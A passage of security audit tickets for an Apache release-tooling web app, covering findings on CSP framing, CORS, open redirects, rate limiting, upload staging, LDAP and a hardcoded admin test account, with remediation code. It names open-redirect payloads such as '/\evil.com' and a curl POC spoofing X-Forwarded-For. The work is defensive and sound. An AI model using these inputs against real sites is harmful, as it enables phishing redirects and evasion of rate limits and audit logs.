The /downloads/ paths on both release-test.apache.org and tooling-vm-ec2-de.apache.org are configured with ProxyPass !, meaning they bypass the application entirely and are served directly by Apache. These paths have a Content-Security-Policy header set to 'sandbox' only, without the required 'frame-ancestors' directive. This creates a gap in ASVS 3.4.6 compliance, as these responses rely solely on the obsolete X-Frame-Options: DENY header for framing protection. The application's _app_setup_security_headers after_request handler never executes for these paths. The 'sandbox' CSP directive restricts page capabilities but does NOT prevent the page from being embedded in a frame.

### Details
In `tooling-vm-ec2-de.apache.org.yaml` (lines 85-93, 149-157), /downloads/ directory blocks lack frame-ancestors directive in CSP.

### Recommended Remediation
Add 'frame-ancestors 'none'' to the CSP for the downloads directories:

```apache
Header always set Content-Security-Policy "sandbox; frame-ancestors 'none'"
```

Apply the same fix to both the release-test.apache.org and tooling-vm-ec2-de.apache.org /downloads/ Directory blocks. Keep X-Frame-Options for defense-in-depth but do not rely upon it.

### Acceptance Criteria
- [ ] frame-ancestors directive added to downloads CSP
- [ ] Applied to both vhost configurations
- [ ] Deployment verified on both servers
- [ ] CSP compliance confirmed via browser tools

### References
- Source reports: L2:3.4.6.md
- Related findings: FINDING-370
- ASVS sections: 3.4.6

### Priority
Medium

---

## Issue: FINDING-193 - API Blueprint Lacks Explicit CORS Preflight Enforcement for Session-Authenticated Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The API blueprint explicitly exempts all endpoints from CSRF validation. For the 8 API endpoints that use session cookie authentication (via common.authenticate()) rather than JWT Bearer tokens, the only explicit cross-origin protection is SameSite=Strict. While this is currently effective, the application also has an implicit Content-Type enforcement through quart_schema.validate_request → get_json(), which rejects non-application/json requests. However, this is a side-effect of the validation library, not an explicit security control documented or designed as a security mechanism. If quart_schema or Quart is updated to use get_json(force=True) or a more permissive parser, this protection would silently disappear without any security test failure or code review flag.

### Details
In `atr/blueprints/api.py` (lines 145-148, 157-159) and `atr/blueprints/common.py` (lines 228-233), session-authenticated API endpoints lack explicit CORS preflight enforcement.

### Recommended Remediation
**Option 1: Explicit Content-Type Enforcement (Recommended)**

```python
@_BLUEPRINT.before_request
@rate_limiter.rate_limit(500, datetime.timedelta(hours=1))
async def _api_rate_limit() -> None:
    """Set API-wide rate limit and enforce CORS preflight for POST requests."""
    if quart.request.method in ("POST", "PUT", "PATCH", "DELETE"):
        content_type = (quart.request.content_type or "").split(";")[0].strip()
        if content_type not in ("application/json", ""):
            return quart.jsonify({"error": "Content-Type must be application/json"}), 415
```

### Acceptance Criteria
- [ ] Explicit Content-Type validation added
- [ ] Non-JSON requests rejected with 415
- [ ] Session-authenticated endpoints protected
- [ ] Unit tests verifying enforcement

### References
- Source reports: L1:3.5.2.md
- ASVS sections: 3.5.2

### Priority
Medium

---

## Issue: FINDING-194 - Open Redirect via Backslash Normalization in OAuth Redirect URI Validation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The OAuth redirect URI validation in the login and logout flows rejects URIs that don't start with '/' or that start with '//', but does not account for the WHATWG URL Standard backslash normalization. Per the spec (§4.4 'relative slash' state), when a URL parser encounters '\' after an initial '/' in a special URL scheme (http/https), it treats '\' identically to '/'. Thus '\' acts as a path separator, and '/\evil.com' is parsed as '//evil.com', a protocol-relative URL pointing to evil.com. The validation passes '/\evil.com' because it starts with '/' and doesn't start with '//', but browsers normalize this to '//evil.com', causing an open redirect.

### Details
In `src/asfquart/generics.py` (lines 48-53, 69-75, 113-119, 164-172), redirect URI validation doesn't account for backslash normalization.

### Recommended Remediation
Add backslash normalization check to redirect URI validation. Create a helper function '_is_safe_redirect':

```python
def _is_safe_redirect(uri: str) -> bool:
    """Validate redirect URI is safe (relative, same-origin only)."""
    if not uri.startswith("/"):
        return False
    if uri.startswith("//"):
        return False
    # Block backslash and URL-encoded backslash
    if "\\" in uri or "%5c" in uri.lower() or "%5C" in uri:
        return False
    # Verify no netloc present after parsing
    parsed = urllib.parse.urlsplit(uri)
    if parsed.netloc:
        return False
    return True
```

Add test cases in `tests/generics.py` to verify rejection of '/%5Cevil.com' and '/\evil.com' for both login and logout flows.

### Acceptance Criteria
- [ ] Backslash normalization check added
- [ ] URL-encoded backslash rejected
- [ ] Test cases added for both flows
- [ ] Unit tests verifying rejection

### References
- Source reports: L2:3.5.4.md
- ASVS sections: 3.5.4

### Priority
Medium

---

## Issue: FINDING-195 - No Evidence of postMessage Origin Validation in Application

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
No frontend JavaScript code was provided for audit. The postMessage API is a client-side browser API that must be validated in JavaScript code. The provided files are exclusively server-side Python (Quart/Flask framework). The template_folder parameter confirms HTML templates exist but were not provided for review. These templates and any associated JavaScript files are where postMessage handlers would reside. If the application uses postMessage without origin validation, an attacker could send crafted messages from a malicious page to manipulate application state, exfiltrate sensitive data, bypass authentication/authorization flows, or execute XSS-equivalent attacks.

### Details
Frontend JavaScript code in templates and static assets was not provided for audit. postMessage usage cannot be assessed without these files.

### Recommended Remediation
The frontend JavaScript codebase must be audited. Any postMessage listener should follow this pattern:

```javascript
window.addEventListener('message', function(event) {
    const TRUSTED_ORIGINS = ['https://your-app.apache.org'];
    if (!TRUSTED_ORIGINS.includes(event.origin)) {
        console.warn('Rejected postMessage from untrusted origin:', event.origin);
        return;
    }
    
    let data;
    try {
        data = JSON.parse(event.data);
    } catch (e) {
        console.error('Invalid postMessage syntax');
        return;
    }
    
    // Validate expected structure
    if (typeof data.action !== 'string' || !isValidAction(data.action)) {
        return;
    }
    
    handleTrustedMessage(data);
});
```

### Acceptance Criteria
- [ ] Frontend JavaScript code audited
- [ ] postMessage listeners identified
- [ ] Origin validation implemented for all listeners
- [ ] Wildcard origins not used in postMessage() calls
- [ ] Unit tests verifying origin validation

### References
- Source reports: L2:3.5.5.md
- ASVS sections: 3.5.5

### Priority
Medium

---

## Issue: FINDING-196 - No Application-Level HTTPS Enforcement for API Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application runs behind a reverse proxy (ProxyFixMiddleware), but has no application-level code to reject or differentiate HTTP requests arriving at API endpoints (/api/*). All HTTP→HTTPS redirect behavior is delegated entirely to the frontend proxy. If the proxy applies a blanket HTTP→HTTPS redirect to all paths (a common default configuration), API clients that erroneously send credentials, JWTs, or sensitive data over HTTP would be silently redirected to HTTPS, masking the data leakage. This violates the core principle of ASVS 4.1.2: API endpoints should fail loudly on HTTP to alert developers of misconfiguration, not silently redirect.

### Details
In `atr/server.py` (lines 91-94) and `atr/blueprints/api.py` (lines 124-128), no application-level HTTPS enforcement exists for API endpoints.

### Recommended Remediation
Add an API-specific before_request hook that rejects non-HTTPS requests:

```python
# atr/blueprints/api.py

@_BLUEPRINT.before_request
async def _enforce_https() -> quart.Response | None:
    """Reject API requests that arrive over plaintext HTTP (ASVS 4.1.2).
    
    User-facing endpoints may redirect HTTP→HTTPS at the proxy level,
    but API endpoints must not silently redirect — they should fail loudly
    so that misconfigured clients are made aware of data leakage.
    """
    if not quart.request.is_secure:
        return quart.jsonify({
            "error": "HTTPS required",
            "detail": "API requests must use HTTPS. Do not rely on HTTP-to-HTTPS redirects.",
        }), 421  # 421 Misdirected Request
```

### Acceptance Criteria
- [ ] HTTPS enforcement added to API blueprint
- [ ] HTTP requests to /api/* return 421 error
- [ ] Error message explains HTTPS requirement
- [ ] Unit tests verifying enforcement

### References
- Source reports: L2:4.1.2.md
- Related findings: FINDING-382
- ASVS sections: 4.1.2

### Priority
Medium

---

## Issue: FINDING-197 - Dev Vhost Does Not Sanitize Client-Supplied X-Forwarded-For

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The development vhost uses `RequestHeader add X-Forwarded-For "%{REMOTE_ADDR}s"` which appends a new value without removing client-supplied `X-Forwarded-For` headers. This allows end-users to inject arbitrary IP addresses into the header chain. If `is_dev_environment()` detection changes or if this config is copied to production, the first `X-Forwarded-For` value (attacker-controlled) may influence `remote_addr`, making IP-based rate limiting bypassable for unauthenticated users and causing audit logs to record spoofed IPs.

### Details
In `tooling-vm-ec2-de.apache.org.yaml` (lines 176-178), the development vhost appends to X-Forwarded-For without sanitizing client-supplied values.

### Recommended Remediation
In the tooling-vm-ec2-de.apache.org.yaml dev vhost section, replace `RequestHeader add X-Forwarded-For "%{REMOTE_ADDR}s"` with `RequestHeader unset X-Forwarded-For`. ProxyAddHeaders On (default) will add the correct X-Forwarded-For value.

POC: `curl -k -H "X-Forwarded-For: 10.0.0.1" https://tooling-vm-ec2-de.apache.org/`

### Acceptance Criteria
- [ ] Client-supplied X-Forwarded-For header removed
- [ ] ProxyAddHeaders On used for header generation
- [ ] IP spoofing prevented in development environment
- [ ] Testing confirms header sanitization

### References
- Source reports: L2:4.1.3.md
- Related findings: FINDING-383
- ASVS sections: 4.1.3

### Priority
Medium

---

## Issue: FINDING-198 - No WebSocket Authentication Framework Exists

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application framework (Quart) natively supports WebSocket endpoints via @app.websocket() decorators. However, none of the authentication controls in the codebase are designed to protect WebSocket channels. The jwtoken.require decorator and asfquart.session.read() function both depend on quart.request, which is only available in HTTP request contexts — not WebSocket contexts (where quart.websocket is the relevant object). If a developer adds a WebSocket endpoint, there is no reusable security control they could apply, creating a high risk of unauthenticated WebSocket access.

### Details
In `atr/jwtoken.py` (lines 84-101, 196-203) and `src/asfquart/session.py` (lines 32-87), authentication controls depend on quart.request, not available in WebSocket contexts.

### Recommended Remediation
Create a WebSocket-specific authentication decorator that validates the session during the HTTPS→WebSocket transition. The decorator should:
1. Validate token from query parameter set during HTTPS session, or validate from cookie shared during WS handshake
2. Close connection with code 1008 if authentication fails
3. Validate Origin header to prevent cross-origin WS hijacking
4. Store validated claims in quart.g for use in the handler

Additionally, implement a dedicated WS token issuance endpoint at /api/ws-token that issues short-lived (60s TTL), WS-audience-specific JWTs through authenticated HTTPS endpoints only.

### Acceptance Criteria
- [ ] WebSocket authentication decorator created
- [ ] Origin header validation implemented
- [ ] Connection closed on authentication failure
- [ ] WS token issuance endpoint implemented
- [ ] Documentation for WebSocket authentication
- [ ] Unit tests verifying authentication

### References
- Source reports: L2:4.4.4.md
- Related findings: FINDING-384, FINDING-385
- ASVS sections: 4.4.4

### Priority
Medium

---

## Issue: FINDING-199 - Upload Staging Token Lacks Session Management Properties

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `upload_session` parameter functions as a dedicated token for the multi-step upload process. However, this token does not comply with ASVS session management requirements for dedicated tokens used outside standard session management. The token is typed as `unsafe.UnsafeStr` with no guarantee of cryptographic randomness, no user binding verification, no expiration mechanism, no revocation capability, and no scope limitation to specific projects/versions.

### Details
In `atr/post/upload.py` (lines 44, 126), upload_session tokens lack proper session management properties.

### Recommended Remediation
Implement proper session management for upload tokens:
1. Generate tokens server-side using `secrets.token_urlsafe(32)` for 256 bits of entropy
2. Store session metadata in database/cache including session_id, user_id, project_key, version_key, created_at, and expires_at (24-hour TTL recommended)
3. Validate all session properties in both stage and finalise endpoints (user binding, scope limitation, expiration)
4. Implement cleanup task to remove expired sessions and staging directories
5. Provide revocation API for users to invalidate sessions before expiration

### Acceptance Criteria
- [ ] Server-side token generation with cryptographic randomness
- [ ] Session metadata storage implemented
- [ ] Session validation in stage and finalise
- [ ] Expiration enforcement
- [ ] Cleanup task for expired sessions
- [ ] Revocation API implemented
- [ ] Unit tests verifying session management

### References
- Source reports: L2:4.4.3.md
- Related findings: FINDING-043
- ASVS sections: 4.4.3

### Priority
Medium

---

## Issue: FINDING-200 - No Cleanup or Aggregate Limit for Upload Staging Directories

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The upload staging mechanism accepts files in multiple stages before finalization. While individual stage requests are bounded by MAX_CONTENT_LENGTH (512 MB), there are no controls on: 1) Aggregate size - total size of all files within a staging directory, 2) File count - number of files per staging session, 3) Cleanup mechanism - abandoned staging directories persist indefinitely, 4) Session lifetime - no expiration for staging sessions. Staging directories are only cleaned during finalise() - if this is never called, files remain permanently. This allows authenticated users to stage many files without finalizing, accumulating disk space over time.

### Details
In `atr/post/upload.py` (lines 137-155), staging accepts files without aggregate size limits, file count limits, or cleanup mechanisms.

### Recommended Remediation
Implement three controls:
1. Add aggregate staging limits - Check current staging directory size and file count before accepting new files. Define MAX_STAGING_SIZE (2GB) and MAX_STAGING_FILES (50) constants. Return 413 error when limits exceeded.
2. Create periodic cleanup task - Implement cleanup_stale_staging() function in new atr/tasks/cleanup.py to remove staging directories older than 24 hours. Run every 6 hours via scheduler.
3. Add configuration - Externalize limits to atr/config.py as MAX_STAGING_SIZE, MAX_STAGING_FILES, and STAGING_MAX_AGE_SECONDS.
4. Add monitoring - Create get_staging_metrics() to track total staging directories, size, and oldest staging age for operational visibility.

### Acceptance Criteria
- [ ] Aggregate staging size limit enforced
- [ ] File count limit enforced
- [ ] Cleanup task removes stale staging directories
- [ ] Configuration externalized
- [ ] Monitoring metrics available
- [ ] Unit tests verifying limits and cleanup

### References
- Source reports: L1:5.2.1.md
- ASVS sections: 5.2.1

### Priority
Medium

---

## Issue: FINDING-201 - In-Memory Hash Function Could Process Unbounded Data

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The compute_sha3_256() function in `atr/hashes.py` accepts a bytes object and processes it entirely in memory, unlike the five other hash functions that use chunked file I/O. If this function is called with user-uploaded file data (up to 512MB per MAX_CONTENT_LENGTH), it could consume significant memory. Five of six hash functions use chunked processing with _HASH_CHUNK_SIZE (4MB), but this function loads the entire data into memory at once. Impact depends on actual call sites which were not verified in audit scope.

### Details
In `atr/hashes.py` (line 51), compute_sha3_256() processes entire bytes object in memory without chunking.

### Recommended Remediation
Four-step remediation:
1. Audit call sites - Search codebase for all invocations of compute_sha3_256() to determine if it's called with user-uploaded data.
2. Add size guard - Implement MAX_IN_MEMORY_SIZE check (10MB) in the function, raising ValueError if exceeded with message directing to file-based alternative.
3. Provide streaming alternative - Create compute_sha3_256_file() that uses chunked reads with _HASH_CHUNK_SIZE (4MB) for memory-safe processing of large files.
4. Update call sites - If any call sites use user-uploaded data, migrate to the streaming version. Add unit tests confirming size guard works.

### Acceptance Criteria
- [ ] Call sites audited
- [ ] Size guard implemented
- [ ] Streaming alternative provided
- [ ] Call sites updated if needed
- [ ] Unit tests verifying size guard

### References
- Source reports: L1:5.2.1.md
- ASVS sections: 5.2.1

### Priority
Medium

---

## Issue: FINDING-202 - Disallowed File Detection Occurs After Storage, Not At Upload Time

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The DISALLOWED_FILENAMES check runs as a background task after files are already stored in the revision directory. This creates a window where dangerous files (such as .htaccess, .htpasswd, or private keys) exist in storage before being flagged, with no automatic remediation mechanism. The data flow is: User uploads file → stored in staging → finalized into revision → file exists in unfinished/project/version/revision/ directory → LATER background task reports the issue → no automatic remediation occurs.

### Details
In `atr/tasks/checks/paths.py` (lines 181-195), disallowed filename detection occurs post-storage without upload-time blocking or automatic remediation.

### Recommended Remediation
Add upload-time blocking in the staging flow by creating a _validate_upload_filename() function that checks against DISALLOWED_FILENAMES and DISALLOWED_SUFFIXES before saving uploaded files. Also add validation in `atr/storage/writers/revision.py` during create_revision_with_quarantine() as defense-in-depth to reject disallowed filenames and extensions before writing files.

### Acceptance Criteria
- [ ] Upload-time filename validation implemented
- [ ] Disallowed files rejected before storage
- [ ] Defense-in-depth validation in revision creation
- [ ] User-friendly error messages
- [ ] Unit tests verifying upload-time blocking

### References
- Source reports: L1:5.3.1.md
- Related findings: FINDING-389, FINDING-390
- ASVS sections: 5.3.1

### Priority
Medium

---

## Issue: FINDING-203 - Pre-Extraction Safety Checks Do Not Verify Total Uncompressed Size

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The check_archive_safety() function runs BEFORE extraction and iterates every archive member with access to member.size attribute, but does not accumulate or validate total uncompressed size against MAX_EXTRACT_SIZE. Total size enforcement is deferred to the extraction phase via exarch SecurityConfig or streaming checks in archives.py. For ZIP files, zipfile.ZipFile.infolist() returns all member metadata from the central directory without decompressing any content, making pre-extraction size validation trivially achievable. An attacker could upload a ZIP with 50,000 files of 40 KB each (~2 GB total) that passes safety checks and begins extraction, consuming significant disk I/O and temporary storage before limits are enforced during extraction.

### Details
In `atr/detection.py` (lines 62-75) and `atr/tasks/quarantine.py` (lines 250-265), pre-extraction safety checks iterate members but don't validate total uncompressed size.

### Recommended Remediation
Add total uncompressed size validation to check_archive_safety() by accumulating member.size during iteration and checking against config.get().MAX_EXTRACT_SIZE. Break iteration and append error message if total exceeds limit. This prevents extraction from starting when size limits would be violated.

### Acceptance Criteria
- [ ] Total uncompressed size calculated during safety check
- [ ] Extraction blocked when total exceeds MAX_EXTRACT_SIZE
- [ ] Error message indicates total size limit exceeded
- [ ] Unit tests verifying pre-extraction size blocking

### References
- Source reports: L2:5.2.3.md
- Related findings: FINDING-396
- ASVS sections: 5.2.3

### Priority
Medium

---

## Issue: FINDING-204 - SSH Authentication Surface Not Covered in Authentication Security Documentation

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The SSH server (`atr/ssh.py`) is a significant authentication entry point that accepts public key authentication from GitHub workflow processes. The authentication security documentation does not address this authentication surface at all. Unlimited authentication attempts are possible against SSH server at the application layer. Auditors and operators cannot assess SSH authentication surface protections. GitHub Issue #723 acknowledges this gap but open issues do not substitute for documentation.

### Details
In `atr/ssh.py`, SSH authentication (SSHServer.connection_made, SSHServer.begin_auth, SSHServer.validate_public_key) is not documented in authentication-security.md.

### Recommended Remediation
Add a dedicated 'SSH Authentication' section to authentication-security.md documenting:
- Authentication mechanism (public key only, 20-minute TTL)
- Anti-automation controls (key-based authentication, logging)
- Current limitations (no connection-level rate limiting tracked in Issue #723, expected to be enforced at network/firewall layer)
- Monitoring of failed SSH authentication attempts

### Acceptance Criteria
- [ ] SSH authentication section added to documentation
- [ ] Authentication mechanism documented
- [ ] Anti-automation controls explained
- [ ] Limitations documented with issue reference
- [ ] Documentation reviewed and approved

### References
- Source reports: L1:6.1.1.md
- ASVS sections: 6.1.1

### Priority
Medium

---

## Issue: FINDING-205 - Documentation Does Not Address Adaptive Response Mechanisms

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
ASVS 6.1.1 explicitly lists 'adaptive response' as a control that should be documented. The authentication security documentation describes static rate limits but does not document any adaptive or progressive response mechanisms. What is NOT documented: what happens when rate limits are repeatedly hit by the same actor, whether rate limit windows escalate, whether there are alerting or monitoring thresholds, or whether there is automated account protection beyond rate limiting. The documentation stops at 'return 429 with retry_after' with no described escalation or adaptive behavior.

### Details
Authentication security documentation lacks any discussion of adaptive response mechanisms beyond static rate limits.

### Recommended Remediation
Document the adaptive response strategy in authentication-security.md. If the project's position is that static rate limits plus OAuth delegation are sufficient, this should be explicitly stated with rationale: password authentication is delegated to ASF OAuth provider with its own adaptive controls, PATs are 256-bit tokens making brute force infeasible, and JWT signing uses server-controlled secrets. Include recommended monitoring thresholds and future considerations.

### Acceptance Criteria
- [ ] Adaptive response section added to documentation
- [ ] Static vs adaptive approach explained with rationale
- [ ] Monitoring recommendations documented
- [ ] Future considerations noted
- [ ] Documentation reviewed and approved

### References
- Source reports: L1:6.1.1.md
- Related findings: ASVS-611-LOW-002
- ASVS sections: 6.1.1

### Priority
Medium

---

## Issue: FINDING-206 - No Password Change Mechanism for LDAP Basic Auth Users

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The application accepts password-based authentication via LDAP basic auth but provides no mechanism—direct or indirect—for users to change their passwords. While OAuth authentication is delegated to the ASF identity provider, LDAP basic-auth users have no password management path. Exhaustive search across all provided source and test files shows no route handler matching password change patterns, no form model for password change, no LDAP modify_s call for userPassword attribute, no link or redirect to external password management URL, and no tests validating password change functionality. The delegation claim exists only in internal documentation, not user-facing.

### Details
In `src/asfquart/session.py` (lines 85-100), LDAP basic auth is supported but no password change mechanism exists in the codebase.

### Recommended Remediation
Priority 1: Add user-facing link to ASF identity provider password change portal in user profile/account management page (https://id.apache.org/reset/enter). Priority 2: Implement direct password change functionality by adding a change_password() method to the committer class in asfpy/ldapadmin.py that uses bcrypt (rounds=12) instead of md5_crypt for password hashing.

### Acceptance Criteria
- [ ] User profile page links to ASF password change portal
- [ ] Link displayed prominently for LDAP users
- [ ] Alternative: Direct password change implemented
- [ ] Documentation updated with password management info

### References
- Source reports: L1:6.2.2.md
- Related findings: ASVS-622-LOW-001, ASVS-622-INFO-001
- ASVS sections: 6.2.2

### Priority
Medium

---

## Issue: FINDING-207 - Admin Tooling Lacks Standardized Password Change Function

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `ldapadmin.py` module provides comprehensive LDAP account lifecycle management including account creation, renaming, and group membership modifications. However, no password change or reset function exists. If an administrator needs to change a user's password, they must craft raw LDAP modifications outside this standardized library, bypassing any security controls. This creates a risk that future implementations may violate ASVS 6.2.3 by not requiring current password verification.

### Details
In `asfpy/ldapadmin.py` (lines 232-290, 180, 320), comprehensive account management exists but no standardized password change function.

### Recommended Remediation
Add a standardized password change method to the `committer` class that enforces current password verification per ASVS 6.2.3. The method should:
1. Verify current password by attempting LDAP bind
2. Validate new password complexity (minimum 12 characters per NIST SP 800-63B)
3. Hash new password with SHA-512-crypt (656,000 rounds)
4. Apply password change via LDAP modify operation
5. Implement comprehensive audit logging

Also add a separate `admin_reset_password()` method for admin-initiated resets with justification logging.

### Acceptance Criteria
- [ ] change_password() method added with current password verification
- [ ] Password complexity validation implemented
- [ ] Secure hashing (SHA-512-crypt) used
- [ ] Audit logging implemented
- [ ] admin_reset_password() method for admin resets
- [ ] Unit tests verifying all functionality

### References
- Source reports: L1:6.2.3.md
- Related findings: ASVS-623-LOW-001
- ASVS sections: 6.2.3

### Priority
Medium

---

## Issue: FINDING-208 - Form Framework Missing PASSWORD Widget Type

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The centralized form rendering framework lacks any capability to render password input fields with `type="password"`. The `Widget` enum does not include a `PASSWORD` variant, the `_get_widget_type()` function has no logic to detect password-type fields, and the `_render_widget()` function has no code path to render password inputs. Any field intended for password entry would fall through to the default `Widget.TEXT` rendering, exposing the typed password in plaintext. This exposes passwords to shoulder surfing, screen recording/sharing software, browser extensions with DOM access, accessibility tools, and browser history/autocomplete.

### Details
In `atr/form.py`, the Widget enum (~line 54), _get_widget_type() (~line 352), and _render_widget() (~line 430) lack password input support.

### Recommended Remediation
1. Add `PASSWORD` to the `Widget` enum: `PASSWORD = "password"`
2. Add rendering in `_render_widget` for `case Widget.PASSWORD` that creates an input with `type="password"` and `autocomplete="current-password"`
3. Optionally add auto-detection in `_get_widget_type` for `pydantic.SecretStr` to return `Widget.PASSWORD`
4. Add optional show/hide toggle support per ASVS 6.2.6 allowance using a button that toggles the input type between 'password' and 'text'

### Acceptance Criteria
- [ ] PASSWORD widget type added to enum
- [ ] Rendering logic for PASSWORD widget implemented
- [ ] Auto-detection for SecretStr optional
- [ ] Show/hide toggle optional
- [ ] Unit tests verifying password input rendering

### References
- Source reports: L1:6.2.6.md
- ASVS sections: 6.2.6

### Priority
Medium

---

## Issue: FINDING-209 - Documented Rate Limits Missing on Three API Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Security documentation explicitly states that sensitive endpoints have 10 requests per hour rate limits. Three endpoints are documented with this limit but lack the @rate_limiter.rate_limit decorator in their implementation, creating false confidence in the security posture. Authenticated users can call these endpoints up to 500 times per hour (API-wide limit) instead of the documented 10 times per hour. The endpoints are: /api/key/delete, /api/distribute/record_from_workflow, /api/distribute/task/status.

### Details
In `atr/api/__init__.py`, three endpoints (key_delete ~lines 390-420, distribution_record_from_workflow ~line 270, update_distribution_task_status ~line 540) lack the documented rate limiting decorator.

### Recommended Remediation
Add `@rate_limiter.rate_limit(10, datetime.timedelta(hours=1))` decorator to all three endpoints: key_delete, distribution_record_from_workflow, and update_distribution_task_status to match documented behavior.

### Acceptance Criteria
- [ ] Rate limiting decorator added to key_delete
- [ ] Rate limiting decorator added to distribution_record_from_workflow
- [ ] Rate limiting decorator added to update_distribution_task_status
- [ ] Unit tests verifying 10/hour limit enforcement

### References
- Source reports: L1:6.3.1.md
- Related findings: Documentation: security/ASVS/audit_guidance/authentication-security.md
- ASVS sections: 6.3.1

### Priority
Medium

---

## Issue: FINDING-210 - Web Blueprints Lack Blueprint-Level Rate Limiting for Authentication

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The API blueprint implements blueprint-wide rate limiting via a before_request handler, but the GET, POST, and admin blueprints lack equivalent protection. This is critical because these blueprints support LDAP Basic authentication via the Authorization header, creating an unthrottled credential stuffing vector. LDAP credential brute force via web routes bypasses API rate limiting. Attacker can attempt unlimited password guesses against LDAP accounts (limited only by unverified global rate limit). The API blueprint's 500/hr limit doesn't protect GET/POST/admin blueprint routes.

### Details
In `atr/blueprints/get.py`, `atr/blueprints/post.py`, and `atr/blueprints/admin.py`, no rate limiting before_request handler exists. LDAP Basic auth is supported via `src/asfquart/session.py` (lines 76-85).

### Recommended Remediation
Add blueprint-level rate limiting to all web blueprints:
1. GET blueprint: `@rate_limiter.rate_limit(100, datetime.timedelta(minutes=1))`
2. POST blueprint: `@rate_limiter.rate_limit(100, datetime.timedelta(minutes=1))`
3. Admin blueprint: `@rate_limiter.rate_limit(30, datetime.timedelta(minutes=1))`

Alternative remediation: Explicitly disable LDAP Basic auth in ATR's configuration with `asfquart.ldap.LDAP_SUPPORTED = False`.

### Acceptance Criteria
- [ ] Rate limiting added to GET blueprint
- [ ] Rate limiting added to POST blueprint
- [ ] Rate limiting added to admin blueprint
- [ ] Or LDAP Basic auth explicitly disabled
- [ ] Unit tests verifying rate limiting enforcement

### References
- Source reports: L1:6.3.1.md
- Related findings: ASVS-631-MED-003, Correct implementation example: atr/blueprints/api.py:121-124
- ASVS sections: 6.3.1

### Priority
Medium

---

## Issue: FINDING-211 - LDAP Authentication Has No Application-Level Failed Attempt Tracking

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The LDAP authentication implementation catches authentication failures but does not track them at the application level. The application relies entirely on LDAP server-side controls for brute force protection, with no application-level visibility into failed authentication patterns or ability to implement application-specific lockout policies. Missing controls include: no application-level counter for failed LDAP authentication attempts, no ability to implement application-specific lockout policies, no correlation of failed attempts across different authentication mechanisms (LDAP vs JWT vs SSH), complete reliance on LDAP server-side controls (which may not be configured), and no application-level visibility into failed authentication patterns.

### Details
In `src/asfquart/ldap.py` (LDAPClient class, get_affiliations() method) and `src/asfquart/session.py` (lines 76-85), LDAP authentication lacks application-level failed attempt tracking. Logging occurs in `atr/log.py` (failed_authentication()) but is passive only.

### Recommended Remediation
Add application-level failed attempt tracking to LDAPClient class with:
1. Dictionary tracking failed attempts by username
2. Configurable lockout threshold (e.g., _MAX_ATTEMPTS = 5)
3. Lockout duration (e.g., _LOCKOUT_SECONDS = 900)
4. Check application-level lockout before attempting LDAP bind
5. Track failures at application level on AuthenticationError

### Acceptance Criteria
- [ ] Failed attempt tracking implemented in LDAPClient
- [ ] Lockout threshold configurable
- [ ] Lockout duration enforced
- [ ] Pre-bind lockout check added
- [ ] Unit tests verifying lockout behavior

### References
- Source reports: L1:6.3.1.md
- Related findings: ASVS-631-MED-002, ASVS-631-LOW-002
- ASVS sections: 6.3.1

### Priority
Medium

---

## Issue: FINDING-212 - Hardcoded "test" Default User Account with Admin Privileges

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The application contains a hardcoded "test" user account that receives full admin privileges when ALLOW_TESTS is enabled. The account name is embedded in multiple locations in the codebase (is_admin(), is_admin_async(), and admin/__init__.py). While mitigating controls exist (Debug-mode-only guard and ALLOW_TESTS must be True), the presence of this well-known, predictable default admin account violates ASVS 6.3.2. If Debug mode is accidentally enabled in a production-like environment, the well-known "test" UID grants complete admin control including user impersonation, JWT key rotation, token revocation, release deletion, and environment variable viewing.

### Details
In `atr/user.py` (lines 32-34, 38-40), hardcoded "test" account receives admin privileges. Also referenced in `atr/admin/__init__.py` and `atr/blueprints/admin.py`.

### Recommended Remediation
Option 1 (RECOMMENDED): Remove hardcoded "test" account entirely from is_admin() and is_admin_async() functions. Use ADMIN_USERS_ADDITIONAL configuration variable in test environments instead. Update test fixtures to use configuration-based approach. 

Option 2: If "test" must remain, use a non-guessable prefix like "__test_admin__" that fails LDAP UID validation to prevent collision.

Verification steps: Remove hardcoded "test" string, update test fixtures to use ADMIN_USERS_ADDITIONAL, verify unit tests pass, add CI/CD lint rule to prevent future hardcoded account names.

### Acceptance Criteria
- [ ] Hardcoded "test" account removed from is_admin()
- [ ] Test fixtures updated to use configuration
- [ ] All unit tests pass
- [ ] CI/CD lint rule added
- [ ] Documentation updated

### References
- Source reports: L1:6.3.2.md
- Related findings: ASVS-632-LOW-002
- ASVS sections: 6.3.2

### Priority
Medium

---

## Issue: FINDING-213 - No Documented Context-Specific Banned Word List for Passwords

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

